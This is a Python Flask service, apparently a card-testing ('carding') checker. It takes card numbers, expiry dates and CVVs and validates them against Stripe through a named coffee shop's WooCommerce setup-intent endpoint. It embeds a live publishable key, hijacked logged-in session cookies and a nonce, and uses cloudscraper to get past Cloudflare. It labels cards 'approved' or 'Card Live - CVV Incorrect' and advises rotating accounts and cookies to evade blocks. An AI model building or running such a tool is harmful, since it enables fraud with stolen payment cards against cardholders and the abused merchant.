from flask import Flask, request, jsonify
import cloudscraper
import requests
import threading
import time
from datetime import datetime

app = Flask(__name__)

STRIPE_PK = 'pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy'

COOKIES = {
    '__cf_bm': 'A9UWMH0qRFN40o1eIDefAIgZHEzlvcPXAonf57iCWMw-1768290583-1.0.1.1-MsHIAV3.sf8ySh.QyKfOGm41IUWhcbMere8W0Jre4LOgJtJUd6K3OK3dU6rV.id9bcf3EjPRbD5icjitxP_vUzASMtFvRZx8OYKkSBdlTng',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2026-01-13%2007%3A19%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2026-01-13%2007%3A19%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F143.0.0.0%20Safari%2F537.36',
    'mtk_src_trk': '%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Fshop.wiseacrebrew.com%2F%22%2C%22session_start_time%22%3A%222026-01-13%2007%3A19%3A47%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D',
    'wordpress_sec_dedd3d5021a06b0ff73c12d14c2f177c': 'theodorefost.e.r.6.4.12.1%7C1769500252%7CpT401Of9wpavBCoW9OY8pP4aK8WUaa6u9utnr147pOj%7C70ba66907e2a01e0b095f6e2cd6e7e8951127a20f8604cb254fdb63053fd1555',
    'wordpress_logged_in_dedd3d5021a06b0ff73c12d14c2f177c': 'theodorefost.e.r.6.4.12.1%7C1769500252%7CpT401Of9wpavBCoW9OY8pP4aK8WUaa6u9utnr147pOj%7Cbc08ed862cca83db2738a761c50d1dcc55204a597aa4f29f319a5e5a8e8b1a93',
    '__stripe_mid': '6003ffd6-a318-4862-a0ef-412b792379409c9ecb',
    '__stripe_sid': '3e4f469e-9317-483b-ac9f-8b9107c2c1a83d2d17',
    'sbjs_session': 'pgs%3D17%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2Faccount%2Fadd-payment-method%2F',
}

AJAX_NONCE = 'dc69c7cb82'

# ==========================================
# 🔒 Concurrent Request Tracking
# ==========================================
class RequestTracker:
    def __init__(self):
        self.active_requests = []
        self.lock = threading.Lock()
    
    def start_request(self, request_id):
        """Mark request as active"""
        with self.lock:
            self.active_requests.append({
                'id': request_id,
                'start_time': datetime.now(),
                'timestamp': time.time()
            })
    
    def end_request(self, request_id):
        """Mark request as complete"""
        with self.lock:
            self.active_requests = [r for r in self.active_requests if r['id'] != request_id]
    
    def get_concurrent_count(self):
        """Get current concurrent request count"""
        with self.lock:
            # Remove old requests (older than 60s)
            current_time = time.time()
            self.active_requests = [r for r in self.active_requests if current_time - r['timestamp'] < 60]
            return len(self.active_requests)
    
    def is_conflict_likely(self):
        """Check if conflict is likely (multiple concurrent requests)"""
        return self.get_concurrent_count() > 1

tracker = RequestTracker()

@app.route('/')
def home():
    concurrent = tracker.get_concurrent_count()
    return jsonify({
        'status': 'running',
        'message': 'Stripe Auth API with Conflict Detection',
        'current_users': concurrent,
        'conflict_risk': 'HIGH' if concurrent > 1 else 'LOW',
        'endpoints': {
            'check': '/api/check (POST)',
            'health': '/ (GET)',
            'stats': '/stats (GET)'
        }
    })

@app.route('/stats')
def stats():
    """Get current API stats"""
    concurrent = tracker.get_concurrent_count()
    return jsonify({
        'active_requests': concurrent,
        'conflict_risk': 'HIGH' if concurrent > 1 else 'LOW',
        'message': f'{concurrent} user(s) currently checking cards'
    })

@app.route('/api/check', methods=['POST'])
def check_card():
    # Generate unique request ID
    request_id = f"{time.time()}_{threading.current_thread().ident}"
    
    # Track this request
    tracker.start_request(request_id)
    
    # Check for concurrent requests
    concurrent_users = tracker.get_concurrent_count()
    conflict_detected = concurrent_users > 1
    
    try:
        data = request.json
        card = data.get('card', '').strip()
        month = data.get('month', '').strip()
        year = data.get('year', '').strip()
        cvv = data.get('cvv', '').strip()
        
        if len(year) == 4:
            year = year[2:]
        
        # Step 1: Create Stripe Payment Method
        headers_stripe = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        }
        
        stripe_payload = (
            f'type=card'
            f'&card[number]={card}'
            f'&card[cvc]={cvv}'
            f'&card[exp_year]={year}'
            f'&card[exp_month]={month.zfill(2)}'
            f'&allow_redisplay=unspecified'
            f'&billing_details[address][postal_code]=10080'
            f'&billing_details[address][country]=US'
            f'&payment_user_agent=stripe.js%2Fe188bca55b%3B+stripe-js-v3%2Fe188bca55b%3B+payment-element%3B+deferred-intent'
            f'&referrer=https%3A%2F%2Fshop.wiseacrebrew.com'
            f'&key={STRIPE_PK}'
            f'&_stripe_version=2024-06-20'
        )
        
        response_stripe = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers_stripe,
            data=stripe_payload,
            timeout=30
        )
        
        if response_stripe.status_code != 200:
            error_msg = response_stripe.json().get('error', {}).get('message', 'Invalid card')
            return jsonify({
                'status': 'declined',
                'message': f'Card Invalid - {error_msg}',
                'code': 'invalid_card'
            })
        
        payment_method_id = response_stripe.json()["id"]
        
        # Step 2: Authorize with Cloudscraper
        scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            }
        )
        
        headers_auth = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://shop.wiseacrebrew.com',
            'referer': 'https://shop.wiseacrebrew.com/account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data_auth = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': AJAX_NONCE,
        }
        
        response_auth = scraper.post(
            'https://shop.wiseacrebrew.com/wp/wp-admin/admin-ajax.php',
            cookies=COOKIES,
            headers=headers_auth,
            data=data_auth,
            timeout=60
        )
        
        # Get response details
        status_code = response_auth.status_code
        result_text = response_auth.text.lower()
        
        # Detect specific issues
        is_cloudflare_block = 'cloudflare' in result_text or 'just a moment' in result_text or status_code == 403
        is_html_error = '<html' in result_text and status_code != 200
        is_session_error = 'session' in result_text or 'logged' in result_text or 'login' in result_text
        is_nonce_error = 'nonce' in result_text or 'expired' in result_text or 'invalid' in result_text
        is_json_error = response_auth.headers.get('content-type', '').startswith('application/json')
        
        # Response detection
        if 'success' in result_text and 'true' in result_text:
            return jsonify({
                'status': 'approved',
                'message': 'Card Authorized Successfully',
                'code': 'approved',
                'concurrent_info': {
                    'users_checking': concurrent_users,
                    'conflict_detected': conflict_detected
                }
            })
        elif 'decline' in result_text or 'declined' in result_text:
            return jsonify({
                'status': 'declined',
                'message': 'Card Declined',
                'code': 'card_declined',
                'concurrent_info': {
                    'users_checking': concurrent_users,
                    'conflict_detected': conflict_detected
                }
            })
        elif 'cvc' in result_text or 'security code' in result_text:
            return jsonify({
                'status': 'approved',
                'message': 'Card Live - CVV Incorrect',
                'code': 'incorrect_cvc',
                'concurrent_info': {
                    'users_checking': concurrent_users,
                    'conflict_detected': conflict_detected
                }
            })
        elif 'expired' in result_text and 'card' in result_text:
            return jsonify({
                'status': 'declined',
                'message': 'Card Expired',
                'code': 'expired_card',
                'concurrent_info': {
                    'users_checking': concurrent_users,
                    'conflict_detected': conflict_detected
                }
            })
        else:
            # ==========================================
            # ⚠️ UNKNOWN RESPONSE WITH CONFLICT INFO
            # ==========================================
            
            # Determine likely cause
            if is_cloudflare_block:
                likely_cause = 'Cloudflare blocked request (403)'
                suggestion = 'Cookies expired or IP blocked. Update cookies.'
            elif conflict_detected:
                likely_cause = f'⚠️ CONFLICT DETECTED! {concurrent_users} users using same account simultaneously'
                suggestion = f'Solution: Use gateway pool with {concurrent_users}+ accounts OR wait {concurrent_users * 10}s'
            elif is_session_error:
                likely_cause = 'Session/Login expired'
                suggestion = 'Account logged out. Update cookies & login.'
            elif is_nonce_error:
                likely_cause = 'Nonce expired or invalid'
                suggestion = 'Update AJAX_NONCE from fresh page.'
            elif is_html_error:
                likely_cause = 'Received HTML error page'
                suggestion = 'Site error or maintenance mode.'
            elif status_code >= 500:
                likely_cause = f'Server error ({status_code})'
                suggestion = 'Gateway site is down. Retry later.'
            elif status_code == 429:
                likely_cause = 'Rate limit exceeded'
                suggestion = 'Too many requests. Wait 60 seconds.'
            else:
                likely_cause = 'New/unexpected response format'
                suggestion = 'Check raw_response for details.'
            
            return jsonify({
                'status': 'unknown',
                'message': 'Unknown Response - Check Debug Info',
                'code': 'unknown',
                
                # 🚨 CONFLICT WARNING
                'concurrent_info': {
                    'users_checking': concurrent_users,
                    'conflict_detected': conflict_detected,
                    'conflict_warning': '⚠️ MULTIPLE USERS DETECTED!' if conflict_detected else None
                },
                
                # 🔍 DEBUG INFORMATION
                'debug': {
                    'http_status': status_code,
                    'likely_cause': likely_cause,
                    'suggestion': suggestion,
                    'detected_issues': {
                        'cloudflare_block': is_cloudflare_block,
                        'session_expired': is_session_error,
                        'nonce_invalid': is_nonce_error,
                        'html_error_page': is_html_error,
                        'concurrent_conflict': conflict_detected,
                        'is_json': is_json_error
                    },
                    'raw_response': result_text[:500],
                    'response_length': len(result_text),
                    'content_type': response_auth.headers.get('content-type', 'unknown')
                }
            })
            
    except requests.exceptions.Timeout:
        return jsonify({
            'status': 'error',
            'message': 'Request Timeout',
            'code': 'timeout',
            'concurrent_info': {
                'users_checking': concurrent_users,
                'conflict_detected': conflict_detected
            }
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Error: {str(e)}',
            'code': 'exception',
            'concurrent_info': {
                'users_checking': concurrent_users,
                'conflict_detected': conflict_detected
            }
        })
    finally:
        # Remove this request from tracking
        tracker.end_request(request_id)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
